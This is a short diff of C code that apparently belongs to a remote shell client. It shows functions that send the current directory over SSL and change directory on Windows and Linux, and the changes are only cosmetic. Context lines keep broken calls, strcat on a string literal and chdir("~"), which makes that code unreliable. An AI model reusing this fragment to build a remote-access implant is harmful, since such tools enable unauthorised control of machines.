@@ -95,13 +95,12 @@ void send_cwd(SSL *ssl)
 
 bool change_directory(const char *dir)
 {
-    char path[MAX_PATH];
     // if they only typed "cd"
     if (dir == NULL)
     {
-        //if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
-        // ^ x86_64-w64-mingw32-gcc doesn't like shlobj.h 
-        
+        // if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
+        //  ^ x86_64-w64-mingw32-gcc doesn't like shlobj.h
+        char path[MAX_PATH];
         if (GetEnvironmentVariableA("USERPROFILE", path, MAX_PATH) > 0)
         {
             if (SetCurrentDirectoryA(path))
@@ -137,7 +136,7 @@ void send_cwd(SSL *ssl)
     {
         strcat("getcwd() error\n", path);
     }
-    
+
     SSL_write(ssl, path, strlen(path));
 }
 
@@ -145,7 +144,7 @@ bool change_directory(const char *dir)
 {
     if (dir == NULL)
     {
-        if(chdir("~") == 0) 
+        if (chdir("~") == 0)
         {
             return true;
         }
